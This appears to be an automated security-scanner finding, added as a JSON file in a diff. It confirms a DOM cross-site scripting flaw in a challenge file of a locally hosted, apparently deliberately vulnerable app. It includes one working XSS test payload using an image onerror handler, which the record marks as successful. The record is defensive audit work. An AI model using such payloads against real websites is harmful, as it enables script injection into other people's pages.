@@ -1,0 +1,27 @@
+{
+  "findingId": "javascript.audit.detect-replaceall-sanitization.detect-replaceall-sanitization",
+  "timestamp": "2026-02-10T18:02:38.778Z",
+  "sourceLocation": {
+    "file": "data/static/codefixes/restfulXssChallenge_2.ts",
+    "line": 62,
+    "column": 34
+  },
+  "vulnerability": {
+    "type": "DOMXSS",
+    "cwe": "CWE-79",
+    "owasp": "A07:2017 - Cross-Site Scripting (XSS)",
+    "xssType": "DOM",
+    "injectionContext": "HTML",
+    "secretType": null
+  },
+  "exploitation": {
+    "endpoint": "http://localhost:3000/data/static/codefixes/restfulXssChallenge_2.ts",
+    "method": "GET",
+    "payload": "<img src=x onerror=alert(1)>",
+    "response": "<img src=x onerror=alert(1)>",
+    "success": true,
+    "proof": "JavaScript alert executed."
+  },
+  "remediation": null,
+  "status": "CONFIRMED"
+}
